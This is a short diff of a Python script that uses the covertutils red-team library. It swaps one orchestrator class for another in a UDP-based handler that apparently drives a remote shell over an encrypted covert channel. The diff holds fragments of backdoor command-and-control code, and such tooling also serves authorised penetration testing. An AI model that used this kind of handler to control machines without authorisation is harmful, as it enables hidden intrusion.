@@ -1,5 +1,5 @@
 from covertutils.handlers import SimpleShellHandler
-from covertutils.orchestration import StackOrchestrator
+from covertutils.orchestration import SimpleOrchestrator
 
 import sys
 import socket
@@ -19,7 +19,7 @@ def recv () :		# Create wrappers for networking
 def send( raw ) :		# Create wrappers for networking
 	return s.sendto( raw, addr )
 
-orch = StackOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, reverse = True, cycling_algorithm = sha512 )
+orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, reverse = True, cycling_algorithm = sha512 )
 handler = SimpleShellHandler( recv, send, orch )	# Create the Handler Daemon Thread
 
 while True :
